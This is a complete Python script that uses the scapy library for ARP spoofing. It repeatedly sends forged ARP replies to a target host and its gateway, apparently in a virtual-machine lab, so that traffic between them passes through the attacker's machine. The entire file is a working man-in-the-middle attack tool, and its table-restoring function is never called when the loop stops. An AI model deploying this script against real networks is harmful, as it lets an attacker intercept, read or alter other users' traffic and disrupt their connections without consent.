import scapy.all as scapy
import time


# gets mac address of an ip
def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


# defines spoof function to poison targets arp table
def arp_spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac_address(target_ip),
                       psrc=spoof_ip)

    scapy.send(packet, verbose=False)


# restores arp table to its default values
def restoration(destination_ip, source_ip):
    destination_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)

    scapy.send(packet, verbose=False)


target_ip = "10.0.2.15"
gateway_ip = "10.0.2.2"

# displays the number of packets in an infinite loop
try:
    sent_packets_count = 0
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
        time.sleep(2)  # Waits for two seconds
except KeyboardInterrupt:  # continues to run except when interrupted and stopped  by using keyboard
    print("\nCtrl + C pressed.............Exiting now")


